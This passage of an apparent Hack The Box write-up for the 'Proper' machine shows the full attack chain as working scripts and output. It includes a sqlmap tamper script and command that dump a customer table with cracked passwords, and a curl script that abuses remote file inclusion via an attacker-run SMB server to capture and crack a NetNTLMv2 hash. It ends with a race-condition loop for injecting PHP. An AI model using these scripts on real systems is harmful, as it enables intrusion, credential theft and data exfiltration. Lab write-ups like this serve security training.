class="line">UserFormat = dynamic_1002  <span class="built_in">type</span> = dynamic_1002: md5(md5(md5(md5(md5(<span class="variable">$p</span>)))))</span><br><span class="line">UserFormat = dynamic_1003  <span class="built_in">type</span> = dynamic_1003: md5(md5(<span class="variable">$p</span>).md5(<span class="variable">$p</span>))</span><br><span class="line">UserFormat = dynamic_1004  <span class="built_in">type</span> = dynamic_1004: md5(md5(md5(md5(md5(md5(<span class="variable">$p</span>))))))</span><br><span class="line">UserFormat = dynamic_1005  <span class="built_in">type</span> = dynamic_1005: md5(md5(md5(md5(md5(md5(md5(<span class="variable">$p</span>)))))))</span><br><span class="line">UserFormat = dynamic_1006  <span class="built_in">type</span> = dynamic_1006: md5(md5(md5(md5(md5(md5(md5(md5(<span class="variable">$p</span>))))))))</span><br><span class="line">UserFormat = dynamic_1007  <span class="built_in">type</span> = dynamic_1007: md5(md5(<span class="variable">$p</span>).<span class="variable">$s</span>) (vBulletin)</span><br><span class="line">UserFormat = dynamic_1008  <span class="built_in">type</span> = dynamic_1008: md5(<span class="variable">$p</span>.<span class="variable">$s</span>) (RADIUS User-Password)</span><br><span class="line">UserFormat = dynamic_1009  <span class="built_in">type</span> = dynamic_1009: md5(<span class="variable">$s</span>.<span class="variable">$p</span>) (RADIUS Responses)</span><br><span class="line">UserFormat = dynamic_1010  <span class="built_in">type</span> = dynamic_1010: md5(<span class="variable">$p</span> null_padded_to_len_100) RAdmin v2.x MD5</span><br><span class="line">UserFormat = dynamic_1011  <span class="built_in">type</span> = dynamic_1011: md5(<span class="variable">$p</span>.md5(<span class="variable">$s</span>)) (webEdition CMS)</span><br><span class="line">UserFormat = dynamic_1012  <span class="built_in">type</span> = dynamic_1012: md5(<span class="variable">$p</span>.md5(<span class="variable">$s</span>)) (webEdition CMS)</span><br><span class="line">UserFormat = dynamic_1013  <span class="built_in">type</span> = dynamic_1013: md5(<span class="variable">$p</span>.PMD5(username)) (webEdition CMS)</span><br><span class="line">UserFormat = dynamic_1014  <span class="built_in">type</span> = dynamic_1014: md5(<span class="variable">$p</span>.<span class="variable">$s</span>) (long salt)</span><br><span class="line">UserFormat = dynamic_1015  <span class="built_in">type</span> = dynamic_1015: md5(md5(<span class="variable">$p</span>.<span class="variable">$u</span>).<span class="variable">$s</span>) (PostgreSQL <span class="string">&#x27;pass the hash&#x27;</span>)</span><br><span class="line">UserFormat = dynamic_1016  <span class="built_in">type</span> = dynamic_1016: md5(<span class="variable">$p</span>.<span class="variable">$s</span>) (long salt)</span><br><span class="line">UserFormat = dynamic_1017  <span class="built_in">type</span> = dynamic_1017: md5(<span class="variable">$s</span>.<span class="variable">$p</span>) (long salt)</span><br><span class="line">UserFormat = dynamic_1018  <span class="built_in">type</span> = dynamic_1018: md5(sha1(sha1(<span class="variable">$p</span>)))</span><br><span class="line">UserFormat = dynamic_1019  <span class="built_in">type</span> = dynamic_1019: md5(sha1(sha1(md5(<span class="variable">$p</span>))))</span><br><span class="line">UserFormat = dynamic_1020  <span class="built_in">type</span> = dynamic_1020: md5(sha1(md5(<span class="variable">$p</span>)))</span><br><span class="line">UserFormat = dynamic_1021  <span class="built_in">type</span> = dynamic_1021: md5(sha1(md5(sha1(<span class="variable">$p</span>))))</span><br><span class="line">UserFormat = dynamic_1022  <span class="built_in">type</span> = dynamic_1022: md5(sha1(md5(sha1(md5(<span class="variable">$p</span>)))))</span><br><span class="line">UserFormat = dynamic_1024  <span class="built_in">type</span> = dynamic_1024: sha1(md5(<span class="variable">$p</span>)) (<span class="built_in">hash</span> truncated to length 32)</span><br><span class="line">UserFormat = dynamic_1025  <span class="built_in">type</span> = dynamic_1025: sha1(md5(md5(<span class="variable">$p</span>))) (<span class="built_in">hash</span> truncated to length 32)</span><br><span class="line">UserFormat = dynamic_1034  <span class="built_in">type</span> = dynamic_1034: md5(<span class="variable">$p</span>.<span class="variable">$u</span>) (PostgreSQL MD5)</span><br><span class="line">UserFormat = dynamic_1300  <span class="built_in">type</span> = dynamic_1300: md5(md5_raw(<span class="variable">$p</span>))</span><br><span class="line">UserFormat = dynamic_1350  <span class="built_in">type</span> = dynamic_1350: md5(md5(<span class="variable">$s</span>.<span class="variable">$p</span>):<span class="variable">$s</span>)</span><br><span class="line">UserFormat = dynamic_1401  <span class="built_in">type</span> = dynamic_1401: md5(<span class="variable">$u</span>.\nskyper\n.<span class="variable">$p</span>) (Skype MD5)</span><br><span class="line">UserFormat = dynamic_1505  <span class="built_in">type</span> = dynamic_1505: md5(<span class="variable">$p</span>.<span class="variable">$s</span>.md5(<span class="variable">$p</span>.<span class="variable">$s</span>))</span><br><span class="line">UserFormat = dynamic_1506  <span class="built_in">type</span> = dynamic_1506: md5(<span class="variable">$u</span>.:XDB:.<span class="variable">$p</span>) (Oracle 12c <span class="string">&quot;H&quot;</span> <span class="built_in">hash</span>)</span><br><span class="line">UserFormat = dynamic_1518  <span class="built_in">type</span> = dynamic_1518: md5(sha1(<span class="variable">$p</span>).md5(<span class="variable">$p</span>).sha1(<span class="variable">$p</span>))</span><br><span class="line">UserFormat = dynamic_1550  <span class="built_in">type</span> = dynamic_1550: md5(<span class="variable">$u</span>.:mongo:.<span class="variable">$p</span>) (MONGODB-CR system <span class="built_in">hash</span>)</span><br><span class="line">UserFormat = dynamic_1551  <span class="built_in">type</span> = dynamic_1551: md5(<span class="variable">$s</span>.<span class="variable">$u</span>.(md5(<span class="variable">$u</span>.:mongo:.<span class="variable">$p</span>)) (MONGODB-CR network <span class="built_in">hash</span>)</span><br><span class="line">UserFormat = dynamic_1552  <span class="built_in">type</span> = dynamic_1552: md5(<span class="variable">$s</span>.<span class="variable">$u</span>.(md5(<span class="variable">$u</span>.:mongo:.<span class="variable">$p</span>)) (MONGODB-CR network <span class="built_in">hash</span>)</span><br><span class="line">UserFormat = dynamic_1560  <span class="built_in">type</span> = dynamic_1560: md5(<span class="variable">$s</span>.<span class="variable">$p</span>.<span class="variable">$s2</span>) (SocialEngine)</span><br><span class="line">UserFormat = dynamic_2000  <span class="built_in">type</span> = dynamic_2000: md5(<span class="variable">$p</span>) (PW &gt; 55 bytes)</span><br><span class="line">UserFormat = dynamic_2001  <span class="built_in">type</span> = dynamic_2001: md5(<span class="variable">$p</span>.<span class="variable">$s</span>) (joomla) (PW &gt; 23 bytes)</span><br><span class="line">UserFormat = dynamic_2002  <span class="built_in">type</span> = dynamic_2002: md5(md5(<span class="variable">$p</span>)) (e107) (PW &gt; 55 bytes)</span><br><span class="line">UserFormat = dynamic_2003  <span class="built_in">type</span> = dynamic_2003: md5(md5(md5(<span class="variable">$p</span>))) (PW &gt; 55 bytes)</span><br><span class="line">UserFormat = dynamic_2004  <span class="built_in">type</span> = dynamic_2004: md5(<span class="variable">$s</span>.<span class="variable">$p</span>) (OSC) (PW &gt; 31 bytes)</span><br><span class="line">UserFormat = dynamic_2005  <span class="built_in">type</span> = dynamic_2005: md5(<span class="variable">$s</span>.<span class="variable">$p</span>.<span class="variable">$s</span>) (PW &gt; 31 bytes)</span><br><span class="line">UserFormat = dynamic_2006  <span class="built_in">type</span> = dynamic_2006: md5(md5(<span class="variable">$p</span>).<span class="variable">$s</span>) (PW &gt; 55 bytes)</span><br><span class="line">UserFormat = dynamic_2008  <span class="built_in">type</span> = dynamic_2008: md5(md5(<span class="variable">$s</span>).<span class="variable">$p</span>) (PW &gt; 23 bytes)</span><br><span class="line">UserFormat = dynamic_2009  <span class="built_in">type</span> = dynamic_2009: md5(<span class="variable">$s</span>.md5(<span class="variable">$p</span>)) (salt &gt; 23 bytes)</span><br><span class="line">UserFormat = dynamic_2010  <span class="built_in">type</span> = dynamic_2010: md5(<span class="variable">$s</span>.md5(<span class="variable">$s</span>.<span class="variable">$p</span>)) (PW &gt; 32 or salt &gt; 23 bytes)</span><br><span class="line">UserFormat = dynamic_2011  <span class="built_in">type</span> = dynamic_2011: md5(<span class="variable">$s</span>.md5(<span class="variable">$p</span>.<span class="variable">$s</span>)) (PW &gt; 32 or salt &gt; 23 bytes)</span><br><span class="line">UserFormat = dynamic_2014  <span class="built_in">type</span> = dynamic_2014: md5(<span class="variable">$s</span>.md5(<span class="variable">$p</span>).<span class="variable">$s</span>) (PW &gt; 55 or salt &gt; 11 bytes)</span><br></pre></td></tr></table></figure>
+
+<p>For a start, I’m going with the dynamic format dynamic_1 (md5($p.$s)) and<br>dynamic_4 (md5($s.$p)). The only difference is that the salt $s is<br>appended for one, and prepended for the other.</p>
+<p>The hash must be made available to JtR in the following format:<br><hash>$<salt></p>
+<p>hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a1b30d31d344a5a4e41e8496ccbdd26b<span class="variable">$hie0shah6ooNoim</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># john -w:subformats --format=dynamic_4 hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (dynamic_4 [md5(<span class="variable">$s</span>.<span class="variable">$p</span>) (OSC) 256/256 AVX2 8x3])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=4</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Warning: Only 3 candidates left, minimum 48 needed <span class="keyword">for</span> performance.</span><br><span class="line"><span class="built_in">id</span> desc          (?)</span><br><span class="line">1g 0:00:00:00 DONE (2021-05-08 05:27) 100.0g/s 300.0p/s 300.0c/s 300.0C/s <span class="built_in">id</span>+desc..id desc</span><br><span class="line">Use the <span class="string">&quot;--show --format=dynamic_4&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>So, the salt is prepended to the value in the order parameter. I see now…</p>
+<h3 id="Database-Enumeration-with-sqlmap"><a href="#Database-Enumeration-with-sqlmap" class="headerlink" title="Database Enumeration with sqlmap"></a>Database Enumeration with sqlmap</h3><p>To that end, I wrote the following sqlmap tamper script to enumerate the<br>database.</p>
+<ul>
+<li>proper.py</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import string</span><br><span class="line">from hashlib import md5</span><br><span class="line">from urllib.parse import quote_plus</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Custom tamper script for Proper</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    salt = b<span class="string">&quot;hie0shah6ooNoim&quot;</span></span><br><span class="line">    h = md5(salt + payload.encode()).hexdigest()</span><br><span class="line">    retVal = <span class="string">&quot;%s&amp;h=%s&quot;</span> % (quote_plus(payload), h)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<p>Because I’m tampering the payload and injecting it onto another parameter,<br>I need to use –skip-urlencode switch when detecting the injection<br>technique like so.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --batch --tamper=proper --skip-urlencode --threads=10 --flush-session</span><br></pre></td></tr></table></figure>
+
+<p>but here i am gona to use another sqlmap command</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot;</span> --<span class="built_in">eval</span>=<span class="string">&quot;import hashlib ; h=hashlib.md5((&#x27;hie0shah6ooNoim&#x27;+order).encode(&#x27;utf-8&#x27;)).hexdigest()&quot;</span>  --batch --threads=10 -D cleaner -T customers --dump</span><br></pre></td></tr></table></figure>
+
+<p>results:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Database: cleaner                                                                                                                      </span><br><span class="line">Table: customers</span><br><span class="line">[29 entries]</span><br><span class="line">+----+------------------------------+----------------------------------------------+----------------------+</span><br><span class="line">| <span class="built_in">id</span> | login                        | password                                     | customer_name        |</span><br><span class="line">+----+------------------------------+----------------------------------------------+----------------------+</span><br><span class="line">| 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c (password1) | Vikki Solomon        |</span><br><span class="line">| 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 (password2) | Neave Stone          |</span><br><span class="line">| 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e (123456)    | Bertie McEachern     |</span><br><span class="line">| 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b (12345)     | Jordana Kleiser      |</span><br><span class="line">| 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b (123456789) | Mariellen Chasemore  |</span><br><span class="line">| 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  | Gwyneth Dornin       |</span><br><span class="line">| 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 (iloveyou)  | Israel Tootell       |</span><br><span class="line">| 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a (princess)  | Karon Mangham        |</span><br><span class="line">| 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 (1234567)   | Janifer Blinde       |</span><br><span class="line">| 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c (rockyou)   | Laurens Lenchenko    |</span><br><span class="line">| 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad (12345678)  | Andreana Austin      |</span><br><span class="line">| 12 | afeldmesserg@ameblo.pj       | e99a18c428cb38d5f260853678922e03 (abc123)    | Arnold Feldmesser    |</span><br><span class="line">| 13 | ahuntarh@seattletimes.moc    | fc63f87c08d505264caba37514cd0cfd (nicole)    | Adella Huntar        |</span><br><span class="line">| 14 | talelsandrovichi@tamu.ude    | aa47f8215c6f30a0dcdb2a36a9f4168e (daniel)    | Trudi Alelsandrovich |</span><br><span class="line">| 15 | ishayj@dmoz.gro              | 67881381dbc68d4761230131ae0008f7 (babygirl)  | Ivy Shay             |</span><br><span class="line">| 16 | acallabyk@un.gro             | d0763edaa9d9bd2a9516280e9044d885 (monkey)    | Alys Callaby         |</span><br><span class="line">| 17 | daeryl@about.you             | 061fba5bdfc076bb7362616668de87c8 (lovely)    | Dorena Aery          |</span><br><span class="line">| 18 | aalekseicikm@skyrock.moc     | aae039d6aa239cfc121357a825210fa3 (jessica)   | Amble Alekseicik     |</span><br><span class="line">| 19 | lginmann@lycos.moc           | c33367701511b4f6020ec61ded352059 (654321)    | Lin Ginman           |</span><br><span class="line">| 20 | lgiorioo@ow.lic              | 0acf4539a14b3aa27deeb4cbdf6e989f (michael)   | Letty Giorio         |</span><br><span class="line">| 21 | lbyshp@wired.moc             | adff44c5102fca279fce7559abf66fee (ashley)    | Lazarus Bysh         |</span><br><span class="line">| 22 | bklewerq@yelp.moc            | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty)    | Bud Klewer           |</span><br><span class="line">| 23 | wstrettellr@senate.gov       | 96e79218965eb72c92a549dd5a330112 (111111)    | Woodrow Strettell    |</span><br><span class="line">| 24 | lodorans@kickstarter.moc     | edbd0effac3fcc98e725920a512881e0 (iloveu)    | Lila O Doran         |</span><br><span class="line">| 25 | bpfeffelt@artisteer.moc      | 670b14728ad9902aecba32e22fa4f6bd (000000)    | Bibbie Pfeffel       |</span><br><span class="line">| 26 | lgrimsdellu@abc.net.uvw      | 2345f10bb948c5665ef91f6773b3e455 (michelle)  | Luce Grimsdell       |</span><br><span class="line">| 27 | lpealingv@goo.goo            | f78f2477e949bee2d12a2c540fb6084f (tigger)    | Lyle Pealing         |</span><br><span class="line">| 28 | krussenw@mit.ude             | 0571749e2ac330a7455809c6b0e7af90 (sunshine)  | Kimmy Russen         |</span><br><span class="line">| 29 | meastmondx@businessweek.moc  | c378985d629e99a4e86213db0cd5e70d (chocolate) | Meg Eastmond         |</span><br><span class="line">+----+------------------------------+----------------------------------------------+----------------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Licensing-Portal"><a href="#Licensing-Portal" class="headerlink" title="Licensing Portal"></a>Licensing Portal</h3><p>Using any of the credentials above should log you in the Licensing Portal.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1951.jpg"></li>
+</ul>
+<p>I’m seeing something familiar in the HTML source code.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1952.jpg"></li>
+</ul>
+<p>Suppose I put .. as the theme and generate the corresponding hash, this is what I get.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://10.10.10.231/licenses/licenses.php?theme=..&amp;h=a48e169864f4b46a09d36664ec645f75</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1953.jpg"></li>
+</ul>
+<h3 id="Remote-File-Inclusion"><a href="#Remote-File-Inclusion" class="headerlink" title="Remote File Inclusion"></a>Remote File Inclusion</h3><p>It appears that the theme parameter is trying to read header.inc.<br>I wrote the following shell script to facilitate testing of the theme parameter<br>and the generation of the hash value in h, driven solely by curl.</p>
+<ul>
+<li>read.sh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">HOST=10.10.10.231</span><br><span class="line">SALT=hie0shah6ooNoim</span><br><span class="line">TRAV=<span class="variable">$1</span></span><br><span class="line">USER=vikki.solomon@throwaway.mail</span><br><span class="line">PASS=password1</span><br><span class="line">COOKIE=$(<span class="built_in">mktemp</span> -u)</span><br><span class="line">PROXY=127.0.0.1:8080</span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line">curl -c <span class="variable">$COOKIE</span> -s -o /dev/null http://<span class="variable">$HOST</span>/licenses/index.php</span><br><span class="line">curl -s \</span><br><span class="line">     -b <span class="variable">$COOKIE</span> \</span><br><span class="line">     -o /dev/null \</span><br><span class="line">     -d <span class="string">&quot;username=<span class="variable">$&#123;USER&#125;</span>&amp;password=<span class="variable">$&#123;PASS&#125;</span>&quot;</span> \</span><br><span class="line">     http://<span class="variable">$HOST</span>/licenses/index.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB RFI</span></span><br><span class="line">curl -s \</span><br><span class="line">     -b <span class="variable">$COOKIE</span> \</span><br><span class="line">     -G \</span><br><span class="line">     -d <span class="string">&quot;theme=<span class="variable">$&#123;TRAV&#125;</span>&quot;</span> \</span><br><span class="line">     -d <span class="string">&quot;h=<span class="subst">$(echo -n $&#123;SALT&#125;$&#123;TRAV&#125; | md5sum | cut -d&#x27; &#x27; -f1)</span>&quot;</span> \</span><br><span class="line">     -o /dev/null \</span><br><span class="line">     -x <span class="variable">$PROXY</span> \</span><br><span class="line">     http://<span class="variable">$HOST</span>/licenses/licenses.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># clean up</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$COOKIE</span></span><br></pre></td></tr></table></figure>
+
+<p>Looks like the theme parameter may be susceptible to remote file inclusion<br>(RFI) vulnerability. Suppose we set up a Python http.server. Let’s see<br>what gives.</p>
+<p>Ah, the http:&#x2F;&#x2F; wrapper is disabled! Let’s try SMB, shall we?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># ./read.sh &#x27;//10.10.14.2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s set up a fake SMB server with Impacket’s smbserver.py without any<br>credentials, and then request again to see what happens.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># python3 smbserver.py -ip 10.10.14.2 -smb2support evil .</span></span><br><span class="line">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.10.10.231,49689)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)</span><br><span class="line">[*] User PROPER\web authenticated successfully</span><br><span class="line">[*] web::PROPER:aaaaaaaaaaaaaaaa:5ae080590082c04362bf224caec4846f:0101000000000000004bce0bf043d70166cff0cb19f10b00000000000100100041006a005500460050007400450075000300100041006a00550046005000740045007500020010006b007a00650061004e006d004f007300040010006b007a00650061004e006d004f00730007000800004bce0bf043d70106000400020000000800300030000000000000000000000000200000fc57632431f7c4e4274794844a744c0e6d27514eb5ddfad885de1bc2cb9a82d40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.10.231,49689)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection (10.10.10.231,49690)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)</span><br><span class="line">[*] User PROPER\web authenticated successfully</span><br><span class="line">[*] web::PROPER:aaaaaaaaaaaaaaaa:8a34397b657ec844eaf1090b53c3175e:010100000000000080e1660cf043d701bf19a63e3a35f7f6000000000100100041006a005500460050007400450075000300100041006a00550046005000740045007500020010006b007a00650061004e006d004f007300040010006b007a00650061004e006d004f0073000700080080e1660cf043d70106000400020000000800300030000000000000000000000000200000fc57632431f7c4e4274794844a744c0e6d27514eb5ddfad885de1bc2cb9a82d40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.10.231,49690)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection (10.10.10.231,49691)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)</span><br><span class="line">[*] User PROPER\web authenticated successfully</span><br><span class="line">[*] web::PROPER:aaaaaaaaaaaaaaaa:52a7d22c0c8c57c70a5c009f030d8c67:01010000000000000078ff0cf043d70196d5908af6592cf2000000000100100041006a005500460050007400450075000300100041006a00550046005000740045007500020010006b007a00650061004e006d004f007300040010006b007a00650061004e006d004f007300070008000078ff0cf043d70106000400020000000800300030000000000000000000000000200000fc57632431f7c4e4274794844a744c0e6d27514eb5ddfad885de1bc2cb9a82d40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.10.231,49691)</span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></table></figure>
+
+<p>Heck, we have PROPER\web authenticating to us with a NetNTLMv2 hash,<br>which can be easily cracked with JtR shown below.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># john -w:/usr/share/wordlists/rockyou.txt ntlmv2</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">charlotte123!    (web)</span><br><span class="line">1g 0:00:00:00 DONE (2021-05-08 02:51) 1.470g/s 1457Kp/s 1457Kc/s 1457KC/s chibii..chaqueto</span><br><span class="line">Use the <span class="string">&quot;--show --format=netntlmv2&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>Now, we can set up smbserver.py with credentials and an empty<br>header.inc to simulate an actual SMB share.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -username web -password <span class="string">&#x27;charlotte123!&#x27;</span> -ip 10.10.14.2 -smb2support evil .</span><br></pre></td></tr></table></figure>
+
+<h3 id="Race-Condition"><a href="#Race-Condition" class="headerlink" title="Race Condition"></a>Race Condition</h3><p>If you look at the debug messages in green above, you’ll notice the race<br>condition vulnerability between strpos and include. Suppose we can<br>modify header.inc in real time, we may be able to get include to execute<br>our PHP code.</p>
+<p>To that end, I wrote the following shell script to modify header.inc in real<br>time.</p>
+<ul>
+<li>race.sh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">PAYLOAD=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> hello world &gt; header.inc</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$PAYLOAD</span>&quot;</span> &gt; header.inc</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
